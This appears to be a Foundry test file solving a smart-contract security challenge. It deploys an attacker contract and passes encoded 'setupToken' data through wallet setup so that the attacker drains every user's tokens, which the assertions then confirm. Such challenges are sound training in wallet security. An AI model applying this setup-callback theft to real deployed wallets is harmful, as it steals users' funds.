// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./utils/WalletRegistryFixture.sol";

import "src/src-default/attacker-contracts/AttackWalletRegistry.sol";

contract WalletRegistryTest is WalletRegistryFixture {
    AttackWalletRegistry public attackContract;

    function setUp() public override {
        super.setUp();
    }

    function test_backdoor() public {
        // Start acting as the attacker for the remainder of the exploit
        vm.startPrank(attacker);

        // Code your exploit here

        attackContract = new AttackWalletRegistry(
            attacker,
            address(walletFactory),
            address(masterCopy),
            address(walletRegistry),
            address(token)
        );

        bytes memory setupData =
            abi.encodeWithSignature("setupToken(address,address)", address(token), address(attackContract));

        attackContract.exploit(users, setupData);

        // Stop acting as the attacker
        vm.stopPrank();
        // Perform exploit validations
        _assertions();
    }

    function _assertions() internal {
        address wallet;
        for (uint256 i = 0; i < users.length; i++) {
            wallet = walletRegistry.wallets(users[i]);

            // Users do in fact have a wallet.
            assert(wallet != address(0));

            // Users are no longer registered as beneficiaries.
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // The attacker has all the tokens.
        assertEq(token.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
